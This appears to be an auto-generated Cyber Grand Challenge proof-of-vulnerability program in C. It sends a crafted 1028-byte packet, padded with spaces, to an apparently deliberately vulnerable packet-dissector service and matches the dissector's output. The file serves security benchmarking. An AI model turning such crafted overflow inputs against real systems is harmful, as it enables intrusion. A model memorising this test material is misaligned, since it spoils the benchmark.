#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x27\x0f\xcb\x96"
         "\x56\x51\x90\x67\xa5\x8b\x5f\x8c\xd9\x42\xc9\x80\x45\x7f\x3c\x44"
         "\xdb\x01\x00\x00\x1c\xe5\xef\x89\xd9\x95\x08\xa5\xc8\x33\x85\xbd"
         "\xb8\x44\x95\x1d\xa6\x81\xe3\xe2\x0b\x08\xa6\x4b\xac\xc9\xc9\x5b"
         "\x0f\x74\x15\x1e\x46\xee\x68\x0b\x31\x90\x73\xfc\x44\xf6\x79\xee"
         "\x51\x0f\xf3\x95\x9e\x79\x3b\x11\x07\x53\x7b\xcc\x56\x5d\x6f\xef"
         "\x60\x4b\x68\x0c\xa5\x22\xa7\xfb\x1b\xc4\x84\x6b\xdc\xf4\xe1\x29"
         "\x9e\xf5\x27\xde\x00\x04\xe1\xbb\x4f\x8f\xa3\x69\xea\xe5\xea\xde"
         "\xdc\x68\xa8\x64\xb3\x5e\xab\x2e\x9e\x8d\x08\x6c\x1a\xec\x92\x62"
         "\x67\xd6\x68\xf7\x70\x4b\x5f\xbd\x15\x36\x09\x3f\x65\x52\xdf\x20"
         "\x7d\x8f\xb0\x5d\xd7\x7b\x3a\xad\xc7\xde\x3b\xa4\x21\x9a\x4e\x63"
         "\x02\xba\xa1\x51\xb2\x8b\xae\x13\x14\x62\x6a\xe2\x1d\x96\x41\xfc"
         "\xfe\xca\x61\x6a\xf3\x59\x45\xb0\x94\x31\x5f\x4f\x70\xa8\x66\x63"
         "\xfa\x80\xe5\x1e\x25\x23\x8b\x7e\xd3\xe8\xbb\x25\xe4\xca\xac\x7c"
         "\xe3\x35\x7e\xd7\x80\x0e\x3f\xd8\xdf\xd6\x5b\x0d\x2d\x4b\x80\xce"
         "\x10\x00\xd4\x43\x64\xdb\xe2\xa9\x76\xbb\x3e\xcf\xe3\x4f\xbd\xaf"
         "\xae\x01\x47\xe6\x16\x3e\x62\x49\x27\x4b\x1d\xed\xd6\x9d\xd3\x34"
         "\xe8\xf8\xbc\x87\xdd\xcd\x9c\x4c\x9b\x4e\x39\x97\xb8\xbc\x44\xde"
         "\x84\x0a\xe2\x99\x74\xbc\xbe\x08\xbe\x7f\x47\x5d\x29\x03\xd3\xc4"
         "\x22\x51\xe2\xf7\xd4\xa3\x97\xa6\x69\xfc\x2f\xc4\x77\x7c\xdc\x6f"
         "\x99\x05\x77\x49\xfb\x10\xd9\xd1\x8c\xdc\xda\xef\x44\x9c\x1f\x65"
         "\xc0\xdf\xfd\x61\xa5\x78\x20\xb4\x90\x89\x60\x9e\xa8\x56\xe1\xdf"
         "\xc0\xc4\x29\x63\x4e\xf6\x14\x10\xfe\x32\x21\x6a\x5b\x26\xdd\x87"
         "\xa0\x31\x32\x86\x65\xf7\x7e\x4c\xa8\x6c\x1e\xda\xa8\x5f\xbe\x58"
         "\x32\x33\x60\xb2\xc4\x93\xb8\xb5\x80\x08\x5c\xfe\xd6\xa9\xa3\x95"
         "\xed\x48\x64\x8e\xac\xf0\xf5\x81\xdf\xad\x6f\x96\xf0\x0f\x66\xbe"
         "\x86\x2b\x7c\xb0\x23\xe7\xcf\x62\xc6\xca\x29\x32\xe8\x6d\x5f\x8b"
         "\x67\xe3\xeb\x05\x4f\xe4\x57\x40\x84\x15\xb6\xaf\x69\xfc\x92\x80"
         "\xff\xd4\xb6\x77\x22\x8f\xee\x4d\xd6\x00\x86\x76\x13\xcb\xb4\x62"
         "\xbc\xb7\xf2\x24\xd3\x79\xb2\x50\x2a\xd2\x6e\x10\x00\x61\x0e\x27"
         "\x7e\x6e\xad\x2d\x81\xd5\xf2\xb0\xee\x6a\x61\x27\x5f\xf8\x13\xce"
         "\x8f\xa4\xc5\xac\x14\xe8\x0d\x2e\xb9\x25\x9a\x01\xcb\xf3\x43\x47"
         "\x9f\xcd\x7e\x21\x66\xbb\xe5\x58\x78\x1b\x7d\x43\x1b\x9b\x4d\xe8"
         "\x03\x20\x33\xcf\xe7\x63\x0c\x52\x42\x5c\xa3\x37\x55\x63\xd8\x2c"
         "\xd3\xca\x36\xfd\x04\x7b\x35\xfc\x8f\x18\x7b\x4f\xd2\x13\xd8\x66"
         "\x4e\x61\xdb\x64\x31\xd0\x73\xe9\x31\x4d\x15\x51\xfe\xe8\x9e\x90"
         "\xc4\x16\xb9\x2c\xa0\xee\x59\xca\x33\x2f\x9b\x2f\x6a\x06\x27\x01"
         "\xcb\x52\xac\x82\xf5\x56\x58\x07\xbe\x99\x54\x67\xca\x58\x26\xec"
         "\x1e\xd1\x82\x35\x2a\x96\x9b\x5a\x3b\x80\x67\xaa\x0f\x9a\x80\x1b"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===vaporizetannery
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x76\x61\x70\x6f\x72\x69\x7a\x65\x74\x61\x6e"
         "\x6e\x65\x72\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
